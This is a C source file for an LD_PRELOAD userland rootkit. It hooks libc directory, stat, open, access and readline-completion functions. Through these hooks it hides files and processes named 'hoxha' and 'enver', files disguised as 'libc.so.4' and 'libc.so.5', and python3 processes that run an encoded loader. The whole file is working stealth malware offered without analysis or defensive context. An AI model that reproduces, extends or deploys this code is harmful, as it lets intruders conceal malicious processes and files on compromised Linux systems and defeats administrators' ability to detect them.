#define _GNU_SOURCE
#include <dlfcn.h>
#include <errno.h>
#include <stdio.h>
#include <ctype.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <stdarg.h>
#include <readline/readline.h>
#include <readline/history.h>

#define MAX_HIDDEN 32  // Increased to allow dynamic PID entries too

// static names to always hide
static const char *STATIC_HIDE_NAMES[] = {
    "enver",
    "hoxha",
    "libc.so.5",
    "libc.so.4",
    NULL
};

static char *hide_names[MAX_HIDDEN + 1] = { 0 };

// Forward declaration of libhide function
static int libhide(const char *name);

// Helpers to add names or PIDs to hide
static void add_hide_name(const char *name) {
    for (int i = 0; i < MAX_HIDDEN; ++i) {
        if (!hide_names[i]) {
            hide_names[i] = strdup(name);
            return;
        }
    }
}

static void add_hide_pid(pid_t pid) {
    char buf[16];
    snprintf(buf, sizeof(buf), "%d", pid);
    add_hide_name(buf);
}

// ====== READLINE HOOKS ======
static char *(*orig_readline)(const char *) = NULL;
static char **(*orig_rl_completion_matches)(const char *, rl_compentry_func_t *) = NULL;
static char *(*orig_rl_filename_completion_function)(const char *, int) = NULL;

// Custom completion generator that filters hidden files
static char *custom_filename_completion_function(const char *text, int state) {
    static DIR *dir = NULL;
    static char *filename = NULL;
    static size_t text_len = 0;
    static char *dirpath_copy = NULL;
    struct dirent *entry;
    char *result = NULL;

    // If this is the first call for this completion, initialize
    if (!state) {
        if (dir) {
            closedir(dir);
            dir = NULL;
        }
        if (dirpath_copy) {
            free(dirpath_copy);
            dirpath_copy = NULL;
        }
        if (filename) {
            free(filename);
            filename = NULL;
        }
        
        const char *dirpath = ".";
        const char *last_slash = strrchr(text, '/');
        
        if (last_slash) {
            // Text contains a path, extract directory and filename parts
            size_t dir_len = last_slash - text + 1;
            dirpath_copy = malloc(dir_len + 1);
            strncpy(dirpath_copy, text, dir_len);
            dirpath_copy[dir_len] = '\0';
            dirpath = dirpath_copy;
            text = last_slash + 1;
        }
        
        dir = opendir(dirpath);
        if (!dir) {
            if (dirpath_copy) {
                free(dirpath_copy);
                dirpath_copy = NULL;
            }
            return NULL;
        }
        
        text_len = strlen(text);
    }

    // Search for matching entries
    while ((entry = readdir(dir)) != NULL) {
        // Skip hidden files and directories starting with . unless explicitly typed
        if (entry->d_name[0] == '.' && text[0] != '.') {
            continue;
        }
        
        // Check if this entry matches our text
        if (strncmp(entry->d_name, text, text_len) == 0) {
            // Check if this is a hidden entry we need to filter
            if (libhide(entry->d_name)) {
                continue; // Skip hidden entries
            }
            
            filename = strdup(entry->d_name);
            break;
        }
    }

    if (filename) {
        // Reconstruct full path if we had a directory component
        if (dirpath_copy) {
            result = malloc(strlen(dirpath_copy) + strlen(filename) + 1);
            strcpy(result, dirpath_copy);
            strcat(result, filename);
        } else {
            result = strdup(filename);
        }
        free(filename);
        filename = NULL;
    } else {
        if (dir) {
            closedir(dir);
            dir = NULL;
        }
        if (dirpath_copy) {
            free(dirpath_copy);
            dirpath_copy = NULL;
        }
    }

    return result;
}

// Hook rl_filename_completion_function
char *rl_filename_completion_function(const char *text, int state) {
    if (!orig_rl_filename_completion_function) {
        *(void **)&orig_rl_filename_completion_function = 
            dlsym(RTLD_NEXT, "rl_filename_completion_function");
    }
    
    char *result = custom_filename_completion_function(text, state);
    if (!result && orig_rl_filename_completion_function) {
        // Fall back to original function, but filter its results
        result = orig_rl_filename_completion_function(text, state);
        if (result) {
            // Extract basename to check if hidden
            const char *basename = strrchr(result, '/');
            basename = basename ? basename + 1 : result;
            if (libhide(basename)) {
                free(result);
                return NULL;
            }
        }
    }
    
    return result;
}

// Hook rl_completion_matches to filter completion results
char **rl_completion_matches(const char *text, rl_compentry_func_t *entry_func) {
    if (!orig_rl_completion_matches) {
        *(void **)&orig_rl_completion_matches = 
            dlsym(RTLD_NEXT, "rl_completion_matches");
    }
    
    // If this is filename completion, use our custom function
    if (entry_func == rl_filename_completion_function || 
        (orig_rl_filename_completion_function && entry_func == orig_rl_filename_completion_function)) {
        return orig_rl_completion_matches(text, rl_filename_completion_function);
    }
    
    char **matches = orig_rl_completion_matches(text, entry_func);
    if (!matches) return NULL;
    
    // Filter out hidden entries from the matches array
    int i, j;
    for (i = 0, j = 0; matches[i] != NULL; i++) {
        // Extract just the filename part for checking
        const char *basename = strrchr(matches[i], '/');
        basename = basename ? basename + 1 : matches[i];
        
        if (!libhide(basename)) {
            matches[j++] = matches[i];
        } else {
            free(matches[i]);
        }
    }
    matches[j] = NULL;
    
    return matches;
}

// Hook the main readline function
char *readline(const char *prompt) {
    if (!orig_readline) {
        *(void **)&orig_readline = dlsym(RTLD_NEXT, "readline");
    }
    
    return orig_readline(prompt);
}

// Initialization to populate hide_names[]
__attribute__((constructor))
static void init_hide_names(void) {
    // Add static entries
    for (int i = 0; STATIC_HIDE_NAMES[i]; ++i) {
        add_hide_name(STATIC_HIDE_NAMES[i]);
    }

    // Scan /proc for dynamic hiding
    DIR *d = opendir("/proc");
    if (!d) return;

    struct dirent *e;
    while ((e = readdir(d))) {
        if (e->d_type != DT_DIR || !isdigit(e->d_name[0])) continue;

        pid_t pid = atoi(e->d_name);

        // Check /proc/[pid]/comm
        char comm_path[64];
        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
        FILE *f = fopen(comm_path, "r");
        if (!f) continue;

        char name[256];
        if (fgets(name, sizeof(name), f)) {
            name[strcspn(name, "\n")] = 0;

            if (strcmp(name, "hoxha") == 0 || strcmp(name, "enver") == 0) {
                add_hide_pid(pid);

                // Check PPID
                char status_path[64];
                snprintf(status_path, sizeof(status_path), "/proc/%d/status", pid);
                FILE *sf = fopen(status_path, "r");
                if (sf) {
                    char line[256];
                    while (fgets(line, sizeof(line), sf)) {
                        if (strncmp(line, "PPid:", 5) == 0) {
                            pid_t ppid = atoi(line + 5);
                            if (ppid > 1) {
                                add_hide_pid(ppid);
                            }
                            break;
                        }
                    }
                    fclose(sf);
                }
            }
        }
        fclose(f);

        // Check /proc/[pid]/cmdline for python3 -c with encoded loader
        char cmdline_path[64];
        snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);
        FILE *cf = fopen(cmdline_path, "r");
        if (cf) {
            char cmdline[4096];
            size_t len = fread(cmdline, 1, sizeof(cmdline) - 1, cf);
            fclose(cf);

            cmdline[len] = '\0';
            if (strstr(cmdline, "python3") && strstr(cmdline, "encoded_rawcode")) {
                add_hide_pid(pid);
            }
        }
    }

    closedir(d);
}

// Cleanup
__attribute__((destructor))
static void cleanup_hide_names(void) {
    for (int i = 0; i < MAX_HIDDEN && hide_names[i]; ++i) {
        free(hide_names[i]);
        hide_names[i] = NULL;
    }
}

// Check if name matches hidden entry
static int libhide(const char *name) {
    for (int i = 0; i < MAX_HIDDEN && hide_names[i]; ++i) {
        if (strcmp(name, hide_names[i]) == 0) return 1;
    }
    return 0;
}

// FIXED: Move kernel dirent structures to global scope
struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

struct linux_dirent64 {
    uint64_t       d_ino;
    int64_t        d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[];
};

typedef long (*getdents_func_t)(unsigned int, void *, unsigned int);
typedef long (*getdents64_func_t)(unsigned int, void *, unsigned int);

static getdents_func_t orig_getdents = NULL;
static getdents64_func_t orig_getdents64 = NULL;

// Wrapper for getdents syscall
long getdents_syscall(unsigned int fd, void *dirp, unsigned int count) {
    if (!orig_getdents) {
        *(void **)&orig_getdents = dlsym(RTLD_NEXT, "getdents");
        if (!orig_getdents) return -ENOSYS;
    }

    long ret = orig_getdents(fd, dirp, count);
    if (ret <= 0) return ret;

    struct linux_dirent *d;
    int bpos = 0;
    long new_ret = ret;

    while (bpos < ret) {
        d = (struct linux_dirent *)((char *)dirp + bpos);
        if (libhide(d->d_name)) {
            // Remove this entry by shifting subsequent entries
            int next_bpos = bpos + d->d_reclen;
            if (next_bpos < ret) {
                memmove((char *)dirp + bpos, (char *)dirp + next_bpos, ret - next_bpos);
            }
            new_ret -= d->d_reclen;
            ret = new_ret;
        } else {
            bpos += d->d_reclen;
        }
    }

    return new_ret;
}

// Wrapper for getdents64 syscall
long getdents64_syscall(unsigned int fd, void *dirp, unsigned int count) {
    if (!orig_getdents64) {
        *(void **)&orig_getdents64 = dlsym(RTLD_NEXT, "getdents64");
        if (!orig_getdents64) return -ENOSYS;
    }

    long ret = orig_getdents64(fd, dirp, count);
    if (ret <= 0) return ret;

    struct linux_dirent64 *d;
    int bpos = 0;
    long new_ret = ret;

    while (bpos < ret) {
        d = (struct linux_dirent64 *)((char *)dirp + bpos);
        if (libhide(d->d_name)) {
            // Remove this entry by shifting subsequent entries
            int next_bpos = bpos + d->d_reclen;
            if (next_bpos < ret) {
                memmove((char *)dirp + bpos, (char *)dirp + next_bpos, ret - next_bpos);
            }
            new_ret -= d->d_reclen;
            ret = new_ret;
        } else {
            bpos += d->d_reclen;
        }
    }

    return new_ret;
}

// Override the actual syscalls with correct signatures
ssize_t getdents(int fd, void *dirp, size_t count) {
    return getdents_syscall(fd, dirp, count);
}

ssize_t getdents64(int fd, void *dirp, size_t count) {
    return getdents64_syscall(fd, dirp, count);
}

// Enhanced should_hide_path function
static int should_hide_path(const char *path) {
    if (!path) return 0;
    
    const char *basename = strrchr(path, '/');
    basename = basename ? basename + 1 : path;
    
    // Check basename first (your existing logic)
    if (libhide(basename)) return 1;
    
    // Also check if the full path contains hidden patterns
    if (strstr(path, "/hoxha") || strstr(path, "/enver") ||
        strstr(path, "/libc.so.4") || strstr(path, "/libc.so.5") ||
        strstr(path, "hoxha/") || strstr(path, "enver/")) {
        return 1;
    }
    
    return 0;
}

// 1. access() - CRITICAL for bash tab completion
static int (*orig_access)(const char *, int) = NULL;

int access(const char *path, int mode) {
    if (!orig_access) {
        *(void **)&orig_access = dlsym(RTLD_NEXT, "access");
    }
    
    if (should_hide_path(path)) {
        errno = ENOENT;
        return -1;
    }
    
    return orig_access(path, mode);
}

// 2. opendir() - sometimes called directly
static DIR *(*orig_opendir)(const char *) = NULL;

DIR *opendir(const char *name) {
    if (!orig_opendir) {
        *(void **)&orig_opendir = dlsym(RTLD_NEXT, "opendir");
    }
    
    if (should_hide_path(name)) {
        errno = ENOENT;
        return NULL;
    }
    
    return orig_opendir(name);
}

// 3. fopen() - used by completion scripts
static FILE *(*orig_fopen)(const char *, const char *) = NULL;

FILE *fopen(const char *path, const char *mode) {
    if (!orig_fopen) {
        *(void **)&orig_fopen = dlsym(RTLD_NEXT, "fopen");
    }
    
    if (should_hide_path(path)) {
        errno = ENOENT;
        return NULL;
    }
    
    return orig_fopen(path, mode);
}

// 4. open() - low-level file opening
static int (*orig_open)(const char *, int, ...) = NULL;

int open(const char *path, int flags, ...) {
    if (!orig_open) {
        *(void **)&orig_open = dlsym(RTLD_NEXT, "open");
    }
    
    if (should_hide_path(path)) {
        errno = ENOENT;
        return -1;
    }
    
    va_list ap;
    va_start(ap, flags);
    mode_t mode = va_arg(ap, mode_t);
    va_end(ap);
    
    return orig_open(path, flags, mode);
}

// 5. open64() - 64-bit version of open
static int (*orig_open64)(const char *, int, ...) = NULL;

int open64(const char *path, int flags, ...) {
    if (!orig_open64) {
        *(void **)&orig_open64 = dlsym(RTLD_NEXT, "open64");
    }
    
    if (should_hide_path(path)) {
        errno = ENOENT;
        return -1;
    }
    
    va_list ap;
    va_start(ap, flags);
    mode_t mode = va_arg(ap, mode_t);
    va_end(ap);
    
    return orig_open64(path, flags, mode);
}

// Stat hooks for tab complete and others
static int (*orig_stat)(const char *, struct stat *) = NULL;
static int (*orig_lstat)(const char *, struct stat *) = NULL;
static int (*orig_fstat)(int, struct stat *) = NULL;
static int (*orig_stat64)(const char *, struct stat64 *) = NULL;
static int (*orig_lstat64)(const char *, struct stat64 *) = NULL;
static int (*orig_fstat64)(int, struct stat64 *) = NULL;

int stat(const char *path, struct stat *buf) {
    if (!orig_stat) {
        *(void **)&orig_stat = dlsym(RTLD_NEXT, "stat");
    }
    
    if (should_hide_path(path)) {
        errno = ENOENT;
        return -1;
    }
    
    return orig_stat(path, buf);
}

int lstat(const char *path, struct stat *buf) {
    if (!orig_lstat) {
        *(void **)&orig_lstat = dlsym(RTLD_NEXT, "lstat");
    }
    
    if (should_hide_path(path)) {
        errno = ENOENT;
        return -1;
    }
    
    return orig_lstat(path, buf);
}

int fstat(int fd, struct stat *buf) {
    if (!orig_fstat) {
        *(void **)&orig_fstat = dlsym(RTLD_NEXT, "fstat");
    }
    return orig_fstat(fd, buf);
}

int stat64(const char *path, struct stat64 *buf) {
    if (!orig_stat64) {
        *(void **)&orig_stat64 = dlsym(RTLD_NEXT, "stat64");
    }
    
    if (should_hide_path(path)) {
        errno = ENOENT;
        return -1;
    }
    
    return orig_stat64(path, buf);
}

int lstat64(const char *path, struct stat64 *buf) {
    if (!orig_lstat64) {
        *(void **)&orig_lstat64 = dlsym(RTLD_NEXT, "lstat64");
    }
    
    if (should_hide_path(path)) {
        errno = ENOENT;
        return -1;
    }
    
    return orig_lstat64(path, buf);
}

int fstat64(int fd, struct stat64 *buf) {
    if (!orig_fstat64) {
        *(void **)&orig_fstat64 = dlsym(RTLD_NEXT, "fstat64");
    }
    return orig_fstat64(fd, buf);
}

// Readdir hooks 
static struct dirent *(*orig_readdir)(DIR *) = NULL;
static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        *(void **)&orig_readdir = dlsym(RTLD_NEXT, "readdir");
        if (!orig_readdir) {
            errno = ENOSYS;
            return NULL;
        }
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (libhide(entry->d_name)) continue;
        return entry;
    }
    return NULL;
}

struct dirent64 *readdir64(DIR *dirp) {
    if (!orig_readdir64) {
        *(void **)&orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
        if (!orig_readdir64) {
            errno = ENOSYS;
            return NULL;
        }
    }

    struct dirent64 *entry;
    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (libhide(entry->d_name)) continue;
        return entry;
    }
    return NULL;
}
